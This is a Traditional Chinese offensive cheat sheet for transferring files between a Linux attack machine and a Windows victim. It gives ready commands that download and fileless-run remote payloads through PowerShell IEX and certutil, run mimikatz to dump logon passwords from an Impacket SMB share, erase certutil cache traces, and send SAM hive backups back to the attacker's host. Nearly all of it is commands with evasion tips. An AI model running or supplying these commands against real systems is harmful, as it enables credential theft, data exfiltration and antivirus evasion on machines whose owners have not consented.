##  方向一：攻擊機 (Linux) ➔ 受害者 (Windows)

### 方法 1：HTTP 服務 + PowerShell

在 Linux 上啟動一個臨時的 HTTP 服務，並在 Windows 上使用 PowerShell 將檔案拉過去。

**Step 1：在 Linux 上啟動 Python HTTP 伺服器**

```bash
# Python 3 (預設監聽 8000 埠)
python3 -m http.server 80

```

**Step 2：在 Windows (PowerShell) 下載檔案**

```powershell
# 方法 A：使用 Invoke-WebRequest (簡寫 iwr)
Invoke-WebRequest -Uri "http://<攻擊機IP>/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"

# 方法 B：使用 WebClient (速度較快，且能繞過某些舊型限制)
(New-Object System.Net.WebClient).DownloadFile('http://<攻擊機IP>/nc.exe', 'C:\Windows\Temp\nc.exe')

# 方法 C：記憶體載入執行（檔案不落地，直接執行）
IEX (New-Object System.Net.WebClient).DownloadString('http://<攻擊機IP>/payload.ps1')

```

---

### 方法 2：Impacket SMB 共享（免落地、免防毒阻擋首選）

透過 SMB 共享，直接在 Windows 上執行 Linux 上的工具，不需把實體檔案寫入 Windows 硬碟，能有效規避部分防毒軟體的偵測。

**Step 1：在 Linux 上用 Impacket 啟動 SMB 伺服器**

```bash
# 在 Linux 存放工具的目錄下執行：
# 語法：impacket-smbserver <共享目錄名稱> <Linux本地路徑> -smb2support
impacket-smbserver share $(pwd) -smb2support

```

**Step 2：在 Windows 上直接存取或執行**

```cmd
:: 檢查共享目錄內容
dir \\<攻擊機IP>\share

:: 複製檔案到本地
copy \\<攻擊機IP>\share\nc.exe C:\Windows\Temp\nc.exe

:: 直接執行（檔案不落地）
\\<攻擊機IP>\share\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

```

---

### 方法 3：Certutil（Windows 內建「合法」下載工具）

`certutil.exe` 原本是 Windows 用來管理憑證的工具，但它內建下載功能，常被拿來當作下載器（LOLBAS）。

```cmd
:: 使用 certutil 下載
certutil.exe -urlcache -split -f "http://<攻擊機IP>/nc.exe" C:\Windows\Temp\nc.exe

:: 清除快取紀錄（避免被發現跡象）
certutil.exe -urlcache -split -f "http://<攻擊機IP>/nc.exe" delete

```

> ⚠️ **注意**：現代的 Windows Defender 對 `certutil` 下載外部檔案的行為極為敏感，非常容易觸發報警。

---

##  方向二：受害者 (Windows) ➔ 攻擊機 (Linux)

在 Windows 上拿到了機密檔案（如 `sam`、`system` 備份或機密文件），需要傳回 Linux 攻擊機。

### 方法 1：利用 Impacket SMB（最簡單，推薦）

這與前面的 SMB 方法相同，只要我們開啟了 SMB 共享，Windows 就能直接「寫入」回我們的 Linux 機器上。

**Step 1：在 Linux 上啟動允許寫入的 SMB**

```bash
# 確保在一個有寫入權限的 Linux 目錄下執行
impacket-smbserver share $(pwd) -smb2support

```

**Step 2：在 Windows 上直接將檔案 copy 過去**

```cmd
copy C:\Windows\Temp\sam.bak \\<攻擊機IP>\share\sam.bak

```

---

### 方法 2：PowerShell + HTTP POST 上傳

如果環境不允許使用 SMB（例如防火牆擋了 445 埠），可以使用 HTTP POST 方式上傳。

**Step 1：在 Linux 上用 Python 啟動一個可以接收上傳的伺服器**
（因為 Python 內建的 `http.server` 預設不支援 POST 上傳，可以用 Python 寫一小段簡單的 Flask 程式，或者直接用 Linux 工具如 `updog`）

```bash
# 安裝並啟動 updog (支援上傳下載的簡易 HTTP 伺服器)
pip3 install updog
updog -p 80

```

**Step 2：在 Windows (PowerShell) 上傳檔案**

```powershell
$uri = "http://<攻擊機IP>/upload"
$filePath = "C:\Windows\Temp\sam.bak"
Invoke-RestMethod -Uri $uri -Method Post -InFile $filePath -ContentType "application/octet-stream"

```
